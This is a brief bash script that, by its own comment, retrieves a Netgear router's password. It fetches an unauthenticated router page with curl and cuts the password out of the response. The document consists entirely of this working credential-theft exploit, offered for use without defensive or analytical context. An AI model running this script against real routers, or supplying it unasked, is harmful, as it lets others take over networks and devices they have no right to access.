#!/bin/bash
#Script for download netgear password from router
curl "http://192.168.0.1/BSW_cxttongr.htm" >> config 
tail config |head -n 1 | sed 's/^....................//' >> pass0
date >> pass0
echo '*************************************'>> pass0
cat pass0
